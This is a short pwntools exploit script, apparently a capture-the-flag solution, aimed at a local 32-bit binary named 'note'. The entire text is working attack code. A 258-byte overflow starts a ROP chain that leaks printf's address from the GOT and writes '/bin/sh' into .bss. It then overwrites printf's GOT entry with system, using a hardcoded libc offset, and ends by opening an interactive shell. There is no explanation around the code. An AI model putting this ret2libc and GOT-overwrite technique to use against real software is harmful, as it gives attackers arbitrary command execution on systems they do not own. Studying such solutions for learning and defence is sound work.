from pwn import *

p = process('./note')
e = ELF('./note')
#context(arch='i386',os='linux',endian='little',log_level='debug')
cmd='/bin/sh'
main=0x80485c4
pppr=0x08048729
pr=0x08048746
offset=0xe8d0
p.sendline("5")

payload="A"*258
payload+=p32(e.plt['puts'])
payload+=p32(pr)
payload+=p32(e.got['printf'])

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.bss())
payload+=p32(len(cmd)+1)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.got['printf'])
payload+=p32(4)

payload+=p32(e.plt['printf'])
payload+="AAAA"
payload+=p32(e.bss())

p.sendline(payload)

p.recvuntil("\x35\x0a")

printf = u32(p.recv(4))

print "printf :"+hex(printf)

system = printf - offset
print "system :"+hex(system)
p.sendline(cmd)
p.sendline(p32(system))

p.interactive()
